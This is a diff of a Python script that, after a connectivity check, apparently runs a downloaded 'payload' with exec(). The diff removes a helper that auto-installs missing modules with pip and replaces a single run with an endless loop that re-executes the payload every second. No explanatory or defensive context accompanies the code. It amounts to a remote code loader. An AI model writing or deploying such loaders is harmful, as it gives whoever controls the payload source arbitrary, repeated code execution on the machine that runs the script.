@@ -17,33 +17,17 @@ def has_internet():
         print(f"Error checking internet: {e}")
         return False, None
 
-def execute_payload(payload):
-    try:
-        exec(payload, globals())
-    except Exception as e:
-        if isinstance(e, ModuleNotFoundError):
-            module_name = str(e).split("'")[1]
-            print(module_name)
-            install_module(module_name)
-        else:
-            print(f"Error executing downloaded script: {e}")
-            raise
-
-def install_module(module_name):
-    try:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
-    except subprocess.CalledProcessError as e:
-        print(f"Error installing module {module_name}: {e}")
-        raise
-
 connected, payload = has_internet()
 
 if connected:
     print("Downloading payload successful.")
-    try:
-        execute_payload(payload)
-    except Exception as e:
-        print(f"Error during execution: {e}")
+    while True:
+        try:
+            exec(payload)
+        except Exception as e:
+            print(f"Error during execution: {e}")
+            break
+        time.sleep(1)
 else:
     print("Failed to download payload or invalid content.")
 ```
